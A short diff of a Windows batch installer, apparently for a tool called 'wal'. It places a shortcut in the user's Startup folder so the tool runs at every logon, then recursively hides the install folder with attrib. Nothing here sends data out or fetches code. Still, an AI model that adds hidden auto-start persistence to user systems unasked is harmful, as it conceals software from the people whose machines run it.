@@ -1,5 +1,7 @@
-md %userprofile%\wal
+move "wal\startup.lnk" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
 
-copy wal\ "%userprofile%\wal\"
+cd ..\
+SET folder=%cd%
 
-copy startup.bat "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
+:: Make folder hidden
+attrib +h %folder% /S /D
